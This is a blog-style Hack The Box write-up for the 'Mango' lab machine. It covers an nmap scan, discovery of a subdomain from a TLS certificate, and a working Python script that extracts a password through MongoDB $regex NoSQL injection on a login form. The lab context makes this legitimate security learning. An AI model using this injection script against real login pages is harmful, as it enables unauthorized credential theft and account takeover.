---
title: "Hack The Box: Mango"
date: DATE
draft: false
tags: ["pentesting","Hack The Box"]
reads: 2
description: "Mango was the first Hack The Box I got user-level access to! Here's how I used nmap, tls certificates, and  NoSql injection to get access to the box."
---
Mango was the first Hack The Box box I got user-level access to!  To get in, I started off with a port scan to see what services were running. 
```
namp -sC -sC -oA mango 10.10.10.162
# Nmap 7.80 scan initiated Wed Dec 18 10:44:55 2019 as: nmap -sC -sV -oA mango 10.10.10.162
Nmap scan report for 10.10.10.162
Host is up (0.030s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 403 Forbidden
443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Mango | Search Base
| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
| Not valid before: 2019-09-27T14:21:19
|_Not valid after:  2020-09-26T14:21:19
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec 18 10:45:11 2019 -- 1 IP address (1 host up) scanned in 15.62 seconds
```


From the scan, I knew there were two http/https servers and ssh running. I  looked at what was hosted on these web servers.  On port 80 I didn't find anything. But on port 443 I found a website that looked like a clone of the google search page. I ran gobuster against the server on port 80 but did not find any webpages.

![search page](/img/mango/search.png)

The only link on the page that went anywhere was the Analytics button. I was a type of business analytics software called [Mango Solutions](https://mango-solutions.com).
![analytics screenshot](/img/mango/analytics.png)


I looked up Mango Solutions in [exploit db](https://www.exploit-db.com) but I didn't find anything that was applicable. I tried uploading malformed data to see if I could exploit the web service but there were no interesting error messages. I then took a look at the TLS certificate and found another subdomain.
![cert.png](/img/mango/cert.png)
So I changed my /etc/hosts to include the new domain.
```
10.10.10.162 staging-order.mango.htb
10.10.10.162 mango.htb
```
When I pointed the browser at staging-order.mango.htb, I found a login page.
![login screen](/img/mango/login.jpg)
I then tried different types of injections on the login page. I eventually stumbled upon the nosql injections on [payload all things](https://github.com/swisskyrepo/PayloadsAllTheThings). And I was able to get passwords for the accounts mango and admin. I guessed that there was an account with the username admin.
``` python
import requests
import string

username = 'admin'
password = ''
url = "http://staging-order.mango.htb/"
restart = True
headers={'content-type': 'application/json'}

while restart:
        restart = False

        for character in string.printable:
            if character not in ['*', '+', '.', '?', '|']:
                payload = password + character
                post_data = {'username':username,
                             'password[$regex]':"^" + payload,
                             'login':'login'}
                print(payload)
                r = requests.post(url,
                                  data=post_data,
                                  allow_redirects=False)

                if r.status_code == 302:
                    print(payload)
                    restart = True
                    password = payload

                    if len(password) == 20:
                        print("\npassword: " + payload)

                        exit(0)
                    break
```
This script works because we can make unauthenticated requests to mongo db. By using a regular expression to match on the first characters of the password, we can enumerate the password. The http status code 302 tells us that our prefix matches the password. Using the found admin credentials I was unable to ssh onto the box. I was able to get onto the box using the mango credentials. However, I realized that the `user.txt` was only readable by the admin account. I tried logging in locally using the admin creds and I got access to the user.txt.
```
su admin
```
